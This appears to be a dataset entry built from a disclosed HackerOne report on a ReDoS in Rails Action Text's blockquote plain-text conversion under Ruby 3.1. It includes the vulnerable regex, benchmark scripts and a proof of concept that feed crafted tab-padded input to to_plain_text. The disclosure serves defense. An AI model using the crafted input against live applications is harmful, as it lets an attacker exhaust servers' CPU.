# RESOURCE — h1

- source: h1
- class: resource
- cwe: CWE-400
- severity: low
- program: rails
- quality_score: 10

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Action Text ReDoS (Ruby 3.1  or lower)
**Affected Asset:** https://github.com/rails/rails

**Vulnerability Description:**
I have found ReDoS in Action Text. However, it does not occur with Ruby 3.2 or later.

https://github.com/rails/rails/blob/v7.1.3.2/actiontext/lib/action_text/plain_text_conversion.rb#L64

```ruby
      def plain_text_for_blockquote_node(node, index)
        text = plain_text_for_block(node)
        text.sub(/\A(\s*)(.+?)(\s*)\Z/m, '\1“\2”\3')
      end
```
This is used in `ActionText::Fragment#to_plain_text`. https://github.com/rails/rails/blob/v7.1.3.2/actiontext/lib/action_text/fragment.rb#L47

It is a detect result by recheck ( https://makenowjust-labs.github.io/recheck/ ).

{F3078833}

---


Confirm ReDoS with `plain_text_regexp_benchmark.rb`

```ruby
require 'benchmark'

def plain(length)
  text =  "\t" * length + "a" + "\t" * length + "a"
  text.sub(/\A(\s*)(.+?)(\s*)\Z/m, '\1“\2”\3')
end


Benchmark.bm do |x|
  x.report { plain(10) }
  x.report { plain(100) }
  x.report { plain(1000) }
  x.report { plain(10000) }
  x.report { plain(100000) }
end
```

```log
# ruby 3.1.4
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
  [REDACTED_PHONE])

# ruby 3.2.3
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])

# ruby 3.3.0
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])   
```  

---

### PoC

```log
❯ rails new -C  -G -T text
# => Rails 7.1.3.2

❯ rails action_text:install

❯ bundle install

❯ bundle exec bin/rails generate model Message content:rich_text

❯ bundle exec rails db:migrate
```

create `plain_text_benchmark.rb`

```ruby
require 'benchmark'

def plain(length)
  text =  "\t" * length + "a" + "\t" * length + "a"
  message = Message.create!(content: "<blockquote>#{text}</blockquote>")
  message.content.to_plain_text
end


Benchmark.bm do |x|
  x.report { plain(10) }
  x.report { plain(100) }
  x.report { plain(1000) }
  x.report { plain(10000) }
  x.report { plain(100000) }
end
```

```log
# ruby 3.1.4
❯ bundle exec rails runner plain_text_benchmark.rb
       user     system      total        real
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
   [REDACTED_PHONE])
  [REDACTED_PHONE])
```

## Impact

When using ActionText under Ruby 3.1, it is ReDoS if crafted text is sent and `to_plain_text` is called.

The same regular expressions are used in Rails 6.1 and 7.0.

- https://github.com/rails/rails/blob/v6.1.7.7/actiontext/lib/action_text/plain_text_conversion.rb#L58
- https://github.com/rails/rails/blob/v7.

## Analysis / Response

**Vulnerability Class:** resource
**CWE:** CWE-400
**Weakness:** Uncontrolled Resource Consumption
**Severity:** low
**Endpoint Pattern:** https://github.com/rails/rails/blob/v7.1.3.2/actiontext/lib/action_text/plain_text_conversion.rb#L64

**Impact Assessment:**
When using ActionText under Ruby 3.1, it is ReDoS if crafted text is sent and `to_plain_text` is called.

The same regular expressions are used in Rails 6.1 and 7.0.

- https://github.com/rails/rails/blob/v6.1.7.7/actiontext/lib/action_text/plain_text_conversion.rb#L58
- https://github.com/rails/rails/blob/v7.0.8.1/actiontext/lib/action_text/plain_text_conversion.rb#L66

**Remediation:**
Implement rate limiting and request size limits. Set timeouts on all operations. Use circuit breakers for downstream services. Validate input complexity.
